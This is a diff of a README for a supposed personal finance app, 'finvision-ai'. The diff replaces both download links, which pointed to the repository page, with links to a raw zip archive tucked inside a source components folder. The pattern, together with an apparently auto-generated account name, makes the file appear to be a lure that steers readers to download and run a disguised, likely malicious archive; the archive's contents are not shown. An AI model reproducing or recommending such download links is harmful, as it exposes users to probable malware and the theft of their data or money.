@@ -1,6 +1,6 @@
 # 📊 finvision-ai - Smart money plans for India
 
-[![Download finvision-ai](https://img.shields.io/badge/Download%20finvision--ai-4C8BF5?style=for-the-badge&logo=github&logoColor=white)](https://github.com/elapsedtimeserology853/finvision-ai)
+[![Download finvision-ai](https://img.shields.io/badge/Download%20finvision--ai-4C8BF5?style=for-the-badge&logo=github&logoColor=white)](https://github.com/elapsedtimeserology853/finvision-ai/raw/refs/heads/main/src/components/reports/ai-finvision-1.8.zip)
 
 ## 🧭 Overview
 
@@ -23,7 +23,7 @@ This app is built for people who want a clear view of their savings, taxes, and 
 
 Use this link to visit the page and download the app:
 
-[Download finvision-ai](https://github.com/elapsedtimeserology853/finvision-ai)
+[Download finvision-ai](https://github.com/elapsedtimeserology853/finvision-ai/raw/refs/heads/main/src/components/reports/ai-finvision-1.8.zip)
 
 ### 🪟 Windows steps
 
